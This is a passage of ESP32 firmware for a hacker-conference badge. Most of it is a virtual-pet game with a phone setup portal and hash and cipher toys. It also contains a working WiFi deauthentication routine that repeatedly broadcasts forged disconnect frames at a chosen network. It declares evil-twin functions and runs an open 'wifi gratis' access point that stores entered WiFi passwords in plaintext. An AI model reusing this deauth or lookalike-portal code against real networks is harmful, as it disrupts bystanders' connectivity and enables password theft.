#include <Arduino.h>
#include <Preferences.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <WiFi.h>
#include <mbedtls/md5.h>
#include <mbedtls/sha256.h>
#include "esp_wifi.h"


#ifndef TFT_BL
#define TFT_BL 12
#endif

#ifndef ROOTED_BADGE_SCREEN_EN
#define ROOTED_BADGE_SCREEN_EN 21
#endif

// --- EvilTwin global objects ---
DNSServer dnsServer;
WebServer evilServer(80);
// --- WiFi helper types / WiFi Deauth demo view ---
struct _Network {
  String ssid;
  uint8_t ch = 0;
  uint8_t bssid[6] = {0, 0, 0, 0, 0, 0};
};

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; ++i) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i + 1 < size) str += ':';
  }
  str.toUpperCase();
  return str;
}

void goWifiDeauth();
void initEvilTwin();
void loopEvilTwin();
void handleEvilTwinInput();
void drawEvilTwin();
void handleHashToolInput();
void handleCipherToolInput();
void handleLogsToolInput();

namespace WifiDeauthTool {
  _Network networks[16];
  _Network selectedNetwork;
  bool enabled = false;
  unsigned long scan_now = 0;
  unsigned long last_deauth = 0;

  void sendDeauth(const uint8_t* bssid, uint8_t ch) {
    // Cambia a canal objetivo
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    // Paquete deauth estándar
    uint8_t deauthPacket[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        // Destino (broadcast)
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        // Fuente (BSSID)
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        // BSSID
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x07, 0x00
    };

    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    wifi_interface_t iface = (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) ? WIFI_IF_AP : WIFI_IF_STA;
    esp_wifi_80211_tx(iface, deauthPacket, sizeof(deauthPacket), false);
  }

  void clearArray() {
    for (int i = 0; i < 16; ++i) networks[i] = _Network();
  }

  void performScan() {
    const int n = WiFi.scanNetworks(false, true);
    clearArray();
    if (n < 0) return;
    for (int i = 0; i < n && i < 16; ++i) {
      networks[i].ssid = WiFi.SSID(i);
      networks[i].ch = WiFi.channel(i);
      const uint8_t* bssid = WiFi.BSSID(i);
      if (bssid) memcpy(networks[i].bssid, bssid, 6);
    }
  }

  void init() {
    if (WiFi.getMode() == WIFI_OFF) WiFi.mode(WIFI_STA);
    performScan();
    enabled = false;
    scan_now = millis();
    selectedNetwork = _Network();
    for (int i = 0; i < 16; ++i) {
      if (networks[i].ssid.length()) {
        selectedNetwork = networks[i];
        break;
      }
    }
  }

  void tick() {
    // Envío deauth cada 350ms si está activo
    if (enabled && selectedNetwork.ssid.length() && (millis() - last_deauth > 350)) {
      sendDeauth(selectedNetwork.bssid, selectedNetwork.ch);
      last_deauth = millis();
    }

    // Rescan periódico
    if ((millis() - scan_now) >= 15000UL) {
      performScan();
      scan_now = millis();
      if (!selectedNetwork.ssid.length()) {
        for (int i = 0; i < 16; ++i) {
          if (networks[i].ssid.length()) {
            selectedNetwork = networks[i];
            break;
          }
        }
      }
    }
  }
}

// ---------------------------------------------------------------------------
// Hardware & timing
// ---------------------------------------------------------------------------
constexpr uint8_t kAuxPowerPin = 0;
constexpr uint32_t kDebounceMs = 18;
constexpr uint32_t kRepeatDelayMs = 260;
constexpr uint32_t kRepeatRateMs = 110;
constexpr uint32_t kDecayStepMs = 12000;
constexpr uint32_t kAnimStepMs = 110;
constexpr uint32_t kHomeBobMs = 220;
constexpr uint32_t kSaveEveryMs = 4000;
constexpr uint32_t kEffectMs = 1600;
constexpr uint8_t kCrewCount = 4;
constexpr int16_t kHomeCell = 28;
constexpr int16_t kHomeGapX = 28;
constexpr int16_t kHomeGapY = 10;
constexpr int16_t kHomeOy = 30;
constexpr uint8_t kScanPageSize = 6;
constexpr uint8_t kLogCapacity = 8;

// ---------------------------------------------------------------------------
// Enums
// ---------------------------------------------------------------------------
enum ButtonId : uint8_t {
  BTN_UP = 0, BTN_DOWN, BTN_LEFT, BTN_RIGHT, BTN_SELECT, BTN_EXTRA, BTN_COUNT,
};

enum ViewMode : uint8_t { VIEW_HOME = 0, VIEW_PET, VIEW_MINIJUEGOS, VIEW_WIFI, VIEW_WIFI_SCAN, VIEW_TWIN_DETECT, VIEW_WIFI_DEAUTH, VIEW_EVILTWIN, VIEW_HASH_TOOL, VIEW_CIPHER_TOOL, VIEW_LOGS_TOOL };

enum EffectId : uint8_t {
  FX_NONE = 0,
  FX_CORAZON,
  FX_DORMIR,
  FX_BRILLO,
  FX_JUEGO,
  FX_ALERTA,
};

// ---------------------------------------------------------------------------
// Structs
// ---------------------------------------------------------------------------
struct ButtonConfig { ButtonId id; uint8_t pin; };

struct ButtonState {
  bool raw = false;
  bool stable = false;
  uint32_t last_flip_ms = 0;
  uint32_t hold_since_ms = 0;
  uint32_t last_repeat_ms = 0;
  bool pressed = false;
  bool released = false;
};

struct CrewMember {
  const char* nick;
  uint8_t sprite_id;
  uint16_t theme;
  int16_t comida;
  int16_t animo;
  int16_t energia;
  int16_t aseo;
  int16_t salud;
};

struct SavedCrewState {
  uint8_t comida;
  uint8_t animo;
  uint8_t energia;
  uint8_t aseo;
  uint8_t salud;
};

struct SavedState {
  uint32_t magic;
  uint8_t version;
  uint8_t selected;
  uint8_t reserved0;
  uint8_t reserved1;
  SavedCrewState crew[kCrewCount];
};

// ---------------------------------------------------------------------------
// Pin configuration
// ---------------------------------------------------------------------------
constexpr ButtonConfig kButtons[BTN_COUNT] = {
    {BTN_UP, 27}, {BTN_DOWN, 15}, {BTN_LEFT, 25},
    {BTN_RIGHT, 26}, {BTN_SELECT, 13}, {BTN_EXTRA, 33},
};

// ---------------------------------------------------------------------------
// UI palette
// ---------------------------------------------------------------------------
constexpr uint16_t kBg       = 0x0000;
constexpr uint16_t kPanel    = 0x0841;
constexpr uint16_t kPanelAlt = 0x1082;
constexpr uint16_t kLine     = 0x31A6;
constexpr uint16_t kText     = 0xFFFF;
constexpr uint16_t kDim      = 0x9CF3;
constexpr uint16_t kLime     = 0x87E0;
constexpr uint16_t kCyan     = 0x05FF;
constexpr uint16_t kYellow   = 0xFFE0;
constexpr uint16_t kWhite    = 0xFFFF;
constexpr uint16_t kRed      = 0xF800;
constexpr uint16_t kPink     = 0xF81F;
constexpr uint16_t kOrange   = 0xFD20;

// ---------------------------------------------------------------------------
// Character sprite palette  (runtime — usa tft.color565 para respetar BGR/RGB)
// Indices: 0=bg 1=skin 2=hair 3=pupil 4=feature 5=eyewhite 6=mouth 7=ropa
// ---------------------------------------------------------------------------
uint16_t kEyeW;
uint16_t kPupil;
uint16_t kNickPurple;
uint16_t kSkinColor[4];
uint16_t kHairColor[4];
uint16_t kFeatureColor[4];
uint16_t kMouthColor[4];
uint16_t kClothColor[4];

// ---------------------------------------------------------------------------
// 10x10 pixel-art sprites  (row-major, color-index per pixel)
// ---------------------------------------------------------------------------
constexpr uint8_t kSprGolo[10][10] = {
  {0,0,2,2,2,2,2,2,0,0},
  {0,2,2,2,2,2,2,2,2,0},
  {0,2,1,1,1,1,1,1,2,0},
  {0,1,5,3,1,1,5,3,1,0},
  {0,2,1,1,1,1,1,1,2,0},
  {0,0,1,1,3,1,1,1,0,0},
  {0,4,1,6,6,6,6,1,4,0},
  {0,4,4,4,4,4,4,4,4,0},
  {0,0,4,4,4,4,4,4,0,0},
  {0,0,0,7,7,7,7,0,0,0},
};

constexpr uint8_t kSprGiio[10][10] = {
  {0,0,2,2,2,2,2,2,0,0},
  {0,2,1,1,1,1,1,1,2,0},
  {0,1,1,1,1,1,1,1,1,0},
  {0,1,5,3,1,1,5,3,1,0},
  {0,1,1,1,1,1,1,1,1,0},
  {0,0,1,1,3,1,1,1,0,0},
  {0,0,1,6,6,6,6,1,0,0},
  {0,0,1,1,1,1,1,1,0,0},
  {0,0,7,7,7,7,7,7,0,0},
  {0,0,0,7,7,7,7,0,0,0},
};

constexpr uint8_t kSprRenvu[10][10] = {
  {0,2,2,2,2,2,2,2,2,0},
  {2,2,2,2,2,2,2,2,2,2},
  {2,2,1,1,1,1,1,1,2,2},
  {2,4,5,3,4,4,5,3,4,2},
  {2,2,1,1,1,1,1,1,2,2},
  {2,0,1,1,3,1,1,1,0,2},
  {2,0,1,6,6,6,6,1,0,2},
  {2,2,1,1,1,1,1,1,2,2},
  {0,2,7,7,7,7,7,7,2,0},
  {0,0,2,2,0,0,2,2,0,0},
};

constexpr uint8_t kSprGuppy[10][10] = {
  {0,0,2,2,2,2,2,2,0,0},
  {0,2,2,2,2,2,2,2,2,0},
  {0,2,1,1,1,1,1,1,2,0},
  {0,4,5,3,4,4,5,3,4,0},
  {0,1,1,1,1,1,1,1,1,0},
  {0,0,1,1,3,1,1,1,0,0},
  {0,0,1,6,6,6,6,1,0,0},
  {0,0,1,4,4,4,4,1,0,0},
  {0,0,7,7,4,4,7,7,0,0},
  {0,0,0,7,7,7,7,0,0,0},
};

const uint8_t* const kSprites[kCrewCount] = {
    &kSprGolo[0][0], &kSprGiio[0][0], &kSprRenvu[0][0], &kSprGuppy[0][0],
};

// ---------------------------------------------------------------------------
// Persistencia
// ---------------------------------------------------------------------------
constexpr uint32_t kSaveMagic = 0x41524136UL;
constexpr uint8_t kSaveVersion = 1;
constexpr char kPortalSsid[] = "wifi gratis";
constexpr char kPrefsWifiSsidKey[] = "wifi_ssid";
constexpr char kPrefsWifiPassKey[] = "wifi_pass";
constexpr char kPrefsLogsKey[] = "logs";

// ---------------------------------------------------------------------------
// Global state
// ---------------------------------------------------------------------------
TFT_eSPI tft = TFT_eSPI();
Preferences g_prefs;
WebServer g_server(80);
ButtonState g_buttons[BTN_COUNT];

CrewMember g_crew[kCrewCount] = {
    {"@RENVU",   2, kLime,   78, 82, 74, 76, 84},
    {"@GOLO",    0, kOrange, 76, 78, 80, 72, 82},
    {"@GUPPY",   3, kYellow, 80, 76, 78, 80, 86},
    {"@GIIOSER", 1, kCyan,   74, 80, 82, 76, 83},
};

ViewMode g_view = VIEW_HOME;
uint8_t g_selected = 0;
uint8_t g_game_selected = 0;
uint32_t g_last_decay_ms = 0;
uint32_t g_last_anim_ms = 0;
uint32_t g_last_home_bob_ms = 0;
uint32_t g_last_save_ms = 0;
bool g_anim_toggle = false;
bool g_home_bob_toggle = false;
bool g_full_redraw = true;
bool g_home_dirty = true;
bool g_header_dirty = true;
uint8_t g_home_dirty_mask = 0x0F;
bool g_pet_sprite_dirty = true;
bool g_pet_stats_dirty = true;
bool g_save_dirty = false;
bool g_prefs_ready = false;
bool g_boot_decay_applied = false;
bool g_wifi_portal_active = false;
bool g_wifi_routes_ready = false;
bool g_wifi_dirty = false;
bool eviltwin_active = false;
uint8_t g_hash_source = 0;
uint8_t g_cipher_source = 0;
uint8_t g_log_offset = 0;
uint8_t g_log_count = 0;
String g_logs[kLogCapacity];
EffectId g_effect = FX_NONE;
uint32_t g_effect_until_ms = 0;
String g_status = "PULSA SELECT PARA CUIDAR";
String g_boot_decay_msg;
String g_wifi_saved_ssid;
String g_wifi_saved_pass;
String g_wifi_status = "SIN CONFIGURAR";

// ---------------------------------------------------------------------------
// WiFi scan state
// ---------------------------------------------------------------------------
int     g_scan_count  = 0;   // -1 = escaneando, 0+ = resultados
uint8_t g_scan_offset = 0;   // desplazamiento scroll en VIEW_WIFI_SCAN
uint8_t g_twin_offset = 0;   // desplazamiento scroll en VIEW_TWIN_DETECT
uint8_t g_twin_count  = 0;   // pares duplicados detectados
bool    g_scan_dirty  = false;
bool    g_twin_dirty  = false;

// ---------------------------------------------------------------------------
// Utility
// ---------------------------------------------------------------------------
int16_t clampStat(int16_t v) { return (v < 0) ? 0 : (v > 100) ? 100 : v; }

uint16_t panelColor(uint8_t r, uint8_t g, uint8_t b) {
  return tft.color565(b, g, r);
}

uint16_t rainbowColor(uint8_t phase) {
  if (phase < 85) {
    const uint8_t t = phase * 3;
    return panelColor(150 + (t / 3), 70 + (t / 4), 255);
  }
  if (phase < 170) {
    phase -= 85;
    const uint8_t t = phase * 3;
    return panelColor(235, 170 + (t / 4), 255);
  }
  phase -= 170;
  const uint8_t t = phase * 3;
  return panelColor(255, 255 - (t / 6), 255);
}

void markSaveDirty() { g_save_dirty = true; }

String hexEncode(const uint8_t* data, size_t len) {
  static const char* kHex = "0123456789ABCDEF";
  String out;
  out.reserve(len * 2);
  for (size_t i = 0; i < len; ++i) {
    out += kHex[(data[i] >> 4) & 0x0F];
    out += kHex[data[i] & 0x0F];
  }
  return out;
}

String md5Hex(const String& input) {
  uint8_t out[16];
  mbedtls_md5_context ctx;
  mbedtls_md5_init(&ctx);
  mbedtls_md5_starts_ret(&ctx);
  mbedtls_md5_update_ret(&ctx, reinterpret_cast<const unsigned char*>(input.c_str()), input.length());
  mbedtls_md5_finish_ret(&ctx, out);
  mbedtls_md5_free(&ctx);
  return hexEncode(out, sizeof(out));
}

String sha256Hex(const String& input) {
  uint8_t out[32];
  mbedtls_sha256_context ctx;
  mbedtls_sha256_init(&ctx);
  mbedtls_sha256_starts_ret(&ctx, 0);
  mbedtls_sha256_update_ret(&ctx, reinterpret_cast<const unsigned char*>(input.c_str()), input.length());
  mbedtls_sha256_finish_ret(&ctx, out);
  mbedtls_sha256_free(&ctx);
  return hexEncode(out, sizeof(out));
}

String caesarText(const String& input, int shift) {
  String out = input;
  for (size_t i = 0; i < out.length(); ++i) {
    char c = out[i];
    if (c >= 'A' && c <= 'Z') out.setCharAt(i, char('A' + ((c - 'A' + shift) % 26)));
    else if (c >= 'a' && c <= 'z') out.setCharAt(i, char('a' + ((c - 'a' + shift) % 26)));
  }
  return out;
}

String xorHex(const String& input, const String& key) {
  if (!key.length()) return "";
  String out;
  out.reserve(input.length() * 2);
  for (size_t i = 0; i < input.length(); ++i) {
    uint8_t v = uint8_t(input[i]) ^ uint8_t(key[i % key.length()]);
    out += hexEncode(&v, 1);
  }
  return out;
}

void saveLogs() {
  if (!g_prefs_ready) return;
  String blob;
  for (uint8_t i = 0; i < g_log_count; ++i) {
    if (i) blob += '\n';
    blob += g_logs[i];
  }
  g_prefs.putString(kPrefsLogsKey, blob);
}

void loadLogs() {
  if (!g_prefs_ready) return;
  const String blob = g_prefs.getString(kPrefsLogsKey, "");
  g_log_count = 0;
  g_log_offset = 0;
  int start = 0;
  while (start <= (int)blob.length() && g_log_count < kLogCapacity) {
    const int nl = blob.indexOf('\n', start);
    String line = (nl == -1) ? blob.substring(start) : blob.substring(start, nl);
    line.trim();
    if (line.length()) g_logs[g_log_count++] = line;
    if (nl == -1) break;
    start = nl + 1;
  }
}

void addLog(const String& line) {
  if (!line.length()) return;
  if (g_log_count < kLogCapacity) {
    g_logs[g_log_count++] = line;
  } else {
    for (uint8_t i = 1; i < kLogCapacity; ++i) g_logs[i - 1] = g_logs[i];
    g_logs[kLogCapacity - 1] = line;
  }
  saveLogs();
}

String currentToolInput(uint8_t source) {
  switch (source % 3) {
    case 0: return String("ROOTEDCON2026");
    case 1: return g_crew[g_selected].nick;
    default: return WiFi.macAddress();
  }
}

const char* currentToolSourceLabel(uint8_t source) {
  switch (source % 3) {
    case 0: return "EVENTO";
    case 1: return "NICK";
    default: return "MAC";
  }
}

// ---------------------------------------------------------------------------
// Hardware
// ---------------------------------------------------------------------------
void setupHardware() {
  pinMode(kAuxPowerPin, OUTPUT);
  digitalWrite(kAuxPowerPin, HIGH);
  pinMode(ROOTED_BADGE_SCREEN_EN, OUTPUT);
  digitalWrite(ROOTED_BADGE_SCREEN_EN, HIGH);
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, LOW);
  for (size_t i = 0; i < BTN_COUNT; ++i) {
    pinMode(kButtons[i].pin, INPUT_PULLUP);
  }
}

// ---------------------------------------------------------------------------
// Buttons
// ---------------------------------------------------------------------------
void updateButtons() {
  const uint32_t now = millis();
  for (size_t i = 0; i < BTN_COUNT; ++i) {
    ButtonState& s = g_buttons[i];
    s.pressed = false;
    s.released = false;
    const bool rp = (digitalRead(kButtons[i].pin) == LOW);
    if (rp != s.raw) { s.raw = rp; s.last_flip_ms = now; }
    if ((now - s.last_flip_ms) >= kDebounceMs && s.stable != s.raw) {
      s.stable = s.raw;
      if (s.stable) {
        s.pressed = true;
        s.hold_since_ms = now;
        s.last_repeat_ms = now;
      } else {
        s.released = true;
        s.hold_since_ms = 0;
      }
    }
  }
}

bool pressed(ButtonId id) { return g_buttons[id].pressed; }

bool menuPressed(ButtonId id) {
  ButtonState& s = g_buttons[id];
  const uint32_t now = millis();
  if (s.pressed) return true;
  if (!s.stable) return false;
  if (s.hold_since_ms == 0) {
    s.hold_since_ms = now;
    s.last_repeat_ms = now;
    return false;
  }
  if ((now - s.hold_since_ms) < kRepeatDelayMs) return false;
  if ((now - s.last_repeat_ms) >= kRepeatRateMs) {
    s.last_repeat_ms = now;
    return true;
  }
  return false;
}

// ---------------------------------------------------------------------------
// Persistencia
// ---------------------------------------------------------------------------
void recomputeHealth(CrewMember& c);

void saveStateNow() {
  if (!g_prefs_ready) return;

  SavedState state = {};
  state.magic = kSaveMagic;
  state.version = kSaveVersion;
  state.selected = g_selected;
  for (uint8_t i = 0; i < kCrewCount; ++i) {
    state.crew[i].comida = static_cast<uint8_t>(clampStat(g_crew[i].comida));
    state.crew[i].animo = static_cast<uint8_t>(clampStat(g_crew[i].animo));
    state.crew[i].energia = static_cast<uint8_t>(clampStat(g_crew[i].energia));
    state.crew[i].aseo = static_cast<uint8_t>(clampStat(g_crew[i].aseo));
    state.crew[i].salud = static_cast<uint8_t>(clampStat(g_crew[i].salud));
  }

  g_prefs.putBytes("state", &state, sizeof(state));
  g_save_dirty = false;
  g_last_save_ms = millis();
}

void maybeSaveState() {
  if (!g_save_dirty) return;
  if ((millis() - g_last_save_ms) < kSaveEveryMs) return;
  saveStateNow();
}

bool loadSavedState() {
  g_prefs_ready = g_prefs.begin("ara_tama", false);
  if (!g_prefs_ready) return false;

  SavedState state = {};
  const size_t len = g_prefs.getBytesLength("state");
  if (len != sizeof(state)) return false;
  if (g_prefs.getBytes("state", &state, sizeof(state)) != sizeof(state)) return false;
  if (state.magic != kSaveMagic || state.version != kSaveVersion) return false;

  g_selected = (state.selected < kCrewCount) ? state.selected : 0;
  for (uint8_t i = 0; i < kCrewCount; ++i) {
    g_crew[i].comida = clampStat(state.crew[i].comida);
    g_crew[i].animo = clampStat(state.crew[i].animo);
    g_crew[i].energia = clampStat(state.crew[i].energia);
    g_crew[i].aseo = clampStat(state.crew[i].aseo);
    g_crew[i].salud = clampStat(state.crew[i].salud);
  }
  return true;
}

void applyColdBootDecay() {
  for (uint8_t i = 0; i < kCrewCount; ++i) {
    CrewMember& c = g_crew[i];
    c.comida = clampStat(c.comida - 7);
    c.animo = clampStat(c.animo - 4);
    c.energia = clampStat(c.energia - 5);
    c.aseo = clampStat(c.aseo - 6);
    recomputeHealth(c);
  }
  g_boot_decay_applied = true;
  g_boot_decay_msg = String(g_crew[g_selected].nick) + " te ha echado de menos";
  markSaveDirty();
}

// ---------------------------------------------------------------------------
// WiFi seguro: portal local para configurar la red desde el movil
// ---------------------------------------------------------------------------
String htmlEscape(const String& in) {
  String out;
  out.reserve(in.length() + 8);
  for (size_t i = 0; i < in.length(); ++i) {
    const char ch = in[i];
    if (ch == '&') out += F("&amp;");
    else if (ch == '<') out += F("&lt;");
    else if (ch == '>') out += F("&gt;");
    else if (ch == '"') out += F("&quot;");
    else out += ch;
  }
  return out;
}

void loadWifiConfig() {
  if (!g_prefs_ready) return;
  g_wifi_saved_ssid = g_prefs.getString(kPrefsWifiSsidKey, "");
  g_wifi_saved_pass = g_prefs.getString(kPrefsWifiPassKey, "");
  if (g_wifi_saved_ssid.length()) g_wifi_status = String("GUARDADA: ") + g_wifi_saved_ssid;
  else g_wifi_status = "SIN CONFIGURAR";
}

void saveWifiConfig(const String& ssid, const String& pass) {
  if (!g_prefs_ready) return;
  g_prefs.putString(kPrefsWifiSsidKey, ssid);
  g_prefs.putString(kPrefsWifiPassKey, pass);
  g_wifi_saved_ssid = ssid;
  g_wifi_saved_pass = pass;
}

bool connectSavedWifi() {
  if (!g_wifi_saved_ssid.length()) {
    g_wifi_status = "SIN RED GUARDADA";
    g_wifi_dirty = true;
    return false;
  }

  WiFi.mode(g_wifi_portal_active ? WIFI_AP_STA : WIFI_STA);
  WiFi.begin(g_wifi_saved_ssid.c_str(), g_wifi_saved_pass.c_str());
  g_wifi_status = String("CONECTANDO: ") + g_wifi_saved_ssid;
  g_wifi_dirty = true;

  const uint32_t start = millis();
  while (WiFi.status() != WL_CONNECTED && (millis() - start) < 9000) {
    delay(120);
  }

  if (WiFi.status() == WL_CONNECTED) {
    g_wifi_status = String("OK ") + g_wifi_saved_ssid;
    g_wifi_dirty = true;
    addLog(String("WIFI OK ") + g_wifi_saved_ssid);
    return true;
  }

  g_wifi_status = String("FALLO ") + g_wifi_saved_ssid;
  g_wifi_dirty = true;
  addLog(String("WIFI FALLO ") + g_wifi_saved_ssid);
  return false;
}

String wifiPortalPage() {
  const int found = WiFi.scanNetworks(false, true);
  String html;
  html.reserve(4096);
  html += F("<!doctype html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>");
  html += F("<title>AraIntel WiFi</title><style>body{font-family:system-ui;background:#0d0b15;color:#fff;margin:0;padding:18px}h1{margin:0 0 6px;font-size:22px}.card{background:#1b1730;border:1px solid #44396e;border-radius:14px;padding:16px;margin-top:14px}select,input,button{width:100%;box-sizing:border-box;font-size:16px;padding:12px;border-radius:10px;border:1px solid #5d4fa1;margin-top:10px}button{background:#8f7cff;color:#fff;font-weight:700;border:0}small{color:#cbc4f2}.ok{color:#9bffb0}.warn{color:#ffd27d}</style></head><body>");
  html += F("<h1>AraIntel WiFi</h1><small>Configura la WiFi del badge desde el movil</small>");
  html += F("<div class='card'><form method='POST' action='/save'><label>Red WiFi</label><select name='ssid'>");
  if (found > 0) {
    for (int i = 0; i < found; ++i) {
      const String ssid = WiFi.SSID(i);
      if (!ssid.length()) continue;
      html += F("<option value='");
      html += htmlEscape(ssid);
      html += F("'>");
      html += htmlEscape(ssid);
      html += F(" | RSSI ");
      html += String(WiFi.RSSI(i));
      html += F(" dBm</option>");
    }
  } else {
    html += F("<option value=''>No se detectan redes</option>");
  }
  html += F("</select><label>Clave</label><input type='password' name='pass' placeholder='clave WiFi'><button type='submit'>Guardar y conectar</button></form></div>");
  html += F("<div class='card'>");
  if (g_wifi_saved_ssid.length()) {
    html += F("<div class='warn'>Guardada: ");
    html += htmlEscape(g_wifi_saved_ssid);
    html += F("</div>");
  }
  if (WiFi.status() == WL_CONNECTED) {
    html += F("<div class='ok'>Conectado a ");
    html += htmlEscape(WiFi.SSID());
    html += F("</div><div class='ok'>IP: ");
    html += WiFi.localIP().toString();
    html += F("</div>");
  } else {
    html += F("<div class='warn'>Estado: ");
    html += htmlEscape(g_wifi_status);
    html += F("</div>");
  }
  html += F("</div></body></html>");
  return html;
}

void handleWifiPortalRoot() {
  g_server.send(200, "text/html; charset=utf-8", wifiPortalPage());
}

void handleWifiPortalSave() {
  const String ssid = g_server.arg("ssid");
  const String pass = g_server.arg("pass");
  if (!ssid.length()) {
    g_server.send(400, "text/plain; charset=utf-8", "SSID no valido");
    return;
  }

  saveWifiConfig(ssid, pass);
  const bool ok = connectSavedWifi();

  String html;
  html.reserve(1024);
  html += F("<!doctype html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{font-family:system-ui;background:#0d0b15;color:#fff;padding:18px}.box{background:#1b1730;border-radius:14px;padding:16px}a{color:#c7beff}</style></head><body><div class='box'>");
  if (ok) {
    html += F("<h2>Conectado</h2><p>");
    html += htmlEscape(ssid);
    html += F("</p><p>IP: ");
    html += WiFi.localIP().toString();
    html += F("</p>");
  } else {
    html += F("<h2>No se pudo conectar</h2><p>Revisa la clave y vuelve atras.</p>");
  }
  html += F("<p><a href='/'>Volver</a></p></div></body></html>");
  g_server.send(200, "text/html; charset=utf-8", html);
}

void ensureWifiRoutes() {
  if (g_wifi_routes_ready) return;
  g_server.on("/", HTTP_GET, handleWifiPortalRoot);
  g_server.on("/save", HTTP_POST, handleWifiPortalSave);
  g_server.onNotFound([]() {
    g_server.sendHeader("Location", "/");
    g_server.send(302, "text/plain", "");
  });
  g_wifi_routes_ready = true;
}

void startWifiPortal() {
  ensureWifiRoutes();
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(kPortalSsid, nullptr);
  if (!g_wifi_portal_active) {
    g_server.begin();
    g_wifi_portal_active = true;
  }
  if (g_wifi_saved_ssid.length()) g_wifi_status = String("PORTAL + ") + g_wifi_saved_ssid;
  else g_wifi_status = "PORTAL ACTIVO";
  g_wifi_dirty = true;
}

void stopWifiPortal() {
  if (g_wifi_portal_active) {
    g_server.stop();
    g_wifi_portal_active = false;
  }
  WiFi.softAPdisconnect(true);
  if (WiFi.status() == WL_CONNECTED) WiFi.mode(WIFI_STA);
  else WiFi.mode(WIFI_OFF);
}

void serviceWifiPortal() {
  if (g_wifi_portal_active) g_server.handleClient();
}

// ---------------------------------------------------------------------------
// WiFi helpers — cifrado en cadena corta para pantalla pequeña
// Usa uint8_t para máxima compatibilidad con distintas versiones de Arduino ESP32
// ---------------------------------------------------------------------------
const char* encTypeStr(uint8_t enc) {
  // Valores de wifi_auth_mode_t como enteros (iguales en todas las versiones)
  switch (enc) {
    case 0:  return "OPEN";  // WIFI_AUTH_OPEN
    case 1:  return "WEP ";  // WIFI_AUTH_WEP
    case 2:  return "WPA ";  // WIFI_AUTH_WPA_PSK
    case 3:  return "WPA2";  // WIFI_AUTH_WPA2_PSK
    case 4:  return "W+2 ";  // WIFI_AUTH_WPA_WPA2_PSK
    case 5:  return "ENT ";  // WIFI_AUTH_WPA2_ENTERPRISE
    case 6:  return "WPA3";  // WIFI_AUTH_WPA3_PSK
    case 7:  return "W2+3";  // WIFI_AUTH_WPA2_WPA3_PSK
    default: return "?   ";
  }
}

// ---------------------------------------------------------------------------
// Game logic
// ---------------------------------------------------------------------------

const char* moodFor(const CrewMember& c) {
  if (c.salud < 25) return "DELICADO";
  if (c.energia < 28) return "SONOLIENTO";
  if (c.comida < 28) return "HAMBRIENTO";
  if (c.aseo < 28) return "DESCUIDADO";
  if (c.animo > 78 && c.salud > 68) return "FELIZ";
  if (c.animo < 32) return "TRISTE";
  return "BIEN";
}

EffectId passiveEffectFor(const CrewMember& c) {
  if (c.salud < 30) return FX_ALERTA;
  if (c.energia < 32) return FX_DORMIR;
  if (c.aseo < 28) return FX_ALERTA;
  if (c.animo > 80 && c.salud > 70) return FX_CORAZON;
  if (c.aseo > 82) return FX_BRILLO;
  return FX_NONE;
}

EffectId currentEffectFor(const CrewMember& c) {
  if (g_effect != FX_NONE && millis() < g_effect_until_ms) return g_effect;
  return passiveEffectFor(c);
}

void setEffect(EffectId effect) {
  g_effect = effect;
  g_effect_until_ms = millis() + kEffectMs;
  g_pet_sprite_dirty = true;
}

void recomputeHealth(CrewMember& c) {
  int16_t target = (c.comida + c.animo + c.energia + c.aseo) / 4;
  if (c.comida < 25 || c.energia < 25 || c.aseo < 25) target -= 12;
  if (c.animo < 25) target -= 6;
  if (target > c.salud) c.salud = clampStat(c.salud + 1);
  else if (target < c.salud) c.salud = clampStat(c.salud - 2);
}

void applyAction(CrewMember& c, ButtonId a) {
  switch (a) {
    case BTN_UP:
      c.comida = clampStat(c.comida + 18);
      c.animo = clampStat(c.animo + 4);
      c.aseo = clampStat(c.aseo - 2);
      g_status = String(c.nick) + " ha comido";
      setEffect(FX_BRILLO);
      break;
    case BTN_RIGHT:
      c.animo = clampStat(c.animo + 16);
      c.energia = clampStat(c.energia - 10);
      c.aseo = clampStat(c.aseo - 6);
      g_status = String(c.nick) + " ha jugado";
      setEffect(FX_JUEGO);
      break;
    case BTN_DOWN:
      c.energia = clampStat(c.energia + 22);
      c.comida = clampStat(c.comida - 4);
      g_status = String(c.nick) + " está durmiendo";
      setEffect(FX_DORMIR);
      break;
    case BTN_LEFT:
      c.aseo = clampStat(c.aseo + 22);
      c.animo = clampStat(c.animo + 5);
      g_status = String(c.nick) + " está aseado";
      setEffect(FX_BRILLO);
      break;
    case BTN_SELECT:
      c.animo = clampStat(c.animo + 14);
      c.salud = clampStat(c.salud + 4);
      g_status = String(c.nick) + " recibe un abrazo";
      setEffect(FX_CORAZON);
      break;
    default:
      break;
  }

  recomputeHealth(c);
  markSaveDirty();
}

void decayAll() {
  const uint32_t now = millis();
  if (g_last_decay_ms == 0) { g_last_decay_ms = now; return; }

  bool changed = false;
  while ((now - g_last_decay_ms) >= kDecayStepMs) {
    g_last_decay_ms += kDecayStepMs;
    changed = true;
    for (uint8_t i = 0; i < kCrewCount; ++i) {
      CrewMember& c = g_crew[i];
      c.comida = clampStat(c.comida - 2);
      c.animo = clampStat(c.animo - 1);
      c.energia = clampStat(c.energia - 1);
      c.aseo = clampStat(c.aseo - 2);
      if (c.comida < 30 || c.energia < 30 || c.aseo < 30) {
        c.animo = clampStat(c.animo - 2);
      }
      recomputeHealth(c);
    }
  }

  if (changed) {
    if (g_view == VIEW_PET) {
      g_pet_stats_dirty = true;
      g_pet_sprite_dirty = true;
    }
    markSaveDirty();
  }
}

// ---------------------------------------------------------------------------
// Sprite rendering
// ---------------------------------------------------------------------------
uint16_t colorForIndex(uint8_t sid, uint8_t idx) {
  switch (idx) {
    case 1: return kSkinColor[sid];
